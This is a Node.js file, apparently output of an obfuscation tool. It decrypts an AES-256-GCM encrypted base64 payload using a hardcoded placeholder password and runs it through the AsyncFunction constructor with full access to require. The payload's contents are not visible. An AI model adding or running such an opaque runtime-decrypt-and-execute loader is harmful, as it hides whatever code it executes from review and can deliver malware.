// ╔══════════════════════════════════════════════════════╗
// ║  Obfuscationary by JusticeTech                      ║
// ║  Version  : 4.0.3                                     ║
// ║  Encrypted: 2026-06-03 12:28:18 UTC                   ║
// ║  Cipher   : AES-256-GCM                               ║
// ║  Tamper   : Protected via SHA-256 integrity check    ║
// ╚══════════════════════════════════════════════════════╝

// Encrypted by Obfuscationary by JusticeTech v4.0.3
(async()=>{
  if(typeof require==='undefined')throw new Error('[Obfuscationary] Use Node.js.');
  const _b64='wLo7zR5SGTD6vAbI/ugu/3CuqcLuSjbdJOUt4Dcr3HgBNgv/y6n0XYYUWyZ/NzwMazdmPcNGFQ89Rb10wuIA/MMl90SFmaD4093XT6v+b+hVRXwUn7WmXG4FqNaNIkFdj/kq7F+DNAGVsbpOWJ63UKKABg75WRLVqHfvmQ5GTRNcVjVqxcb+lMKubF9H2shefuVxWKPPOOAZIsqEuj2EGvK1Hu1MHhUJvBGP0hAm/wbJJmnGkbFkNbfdN51oGO6UfKQg7oGoEbwMMXp+MBlsukJWThIadShzO30pGkK/wq7Za993G7BXTphxgjeHcRxTSaHCkZJ+qzZMnAwgRZCwYfXg6xkwH2eFECweTn8KzvVw7l4fgPbNe/CnxWClGC0qPm40Ftbx02tFBeXelzwmax2FpEy3QW/1VPd2J/IzftEktZaUiw25Vk/LPJWkbk9GmqapFhNBiXZZoiXa2AdkdXWineXz7+m/PSIJRNsBfTaxm8RaZRg1MoEQy6B4j9cmEr8B9YY3NeeeEnTwkVVSv8SVzm+6nJOKHwQjTv515kS/U6x/o/p0lWl2SejHeYqyUKYQzbyGpWn9C5t+H2beqPGSKOa3FYL//WyTx7Et89bD2Ew+wo8mJ6rH4nkqooJJlXE+osXjeNWhsC5pLJUJ+aeGBFy7BtqVBtnkxcGM2XzV7b7trKG9pBSGyYr0cvxWUzKA5VkHt9vUGPPZG7+h888SXQIYC9H4rc/vK+uoNQ==';const _IH='14f8a9b695c82b474f185f651c68e1cc8434b0e1e21c30db8351ce9ee409e4ab';let _src;

  const _PWDS=["change_this_to_a_long_random_secret"];const _ITS=50000;
  const _c2=require('crypto');
  const _ah=_c2.createHash('sha256').update(_b64).digest('hex');
  if(_ah!==_IH)throw new Error('[Obfuscationary] Tamper detected!');
  let _d=Buffer.from(_b64,'base64');
  for(let i=_PWDS.length-1;i>=0;i--){
    const pw=_PWDS[i],sl=_d.slice(0,16),iv=_d.slice(16,28),ct=_d.slice(28);
    const tg=ct.slice(ct.length-16),cd=ct.slice(0,ct.length-16);
    const kk=_c2.pbkdf2Sync(pw,sl,_ITS,32,'sha256');
    const dc=_c2.createDecipheriv('aes-256-gcm',kk,iv);dc.setAuthTag(tg);
    _d=Buffer.concat([dc.update(cd),dc.final()]);
  }
  _src=_d.toString('utf8');

  const _F=Object.getPrototypeOf(async function(){}).constructor;
  await _F('module','exports','require','__filename','__dirname',_src)(module,exports,require,__filename,__dirname);
})();
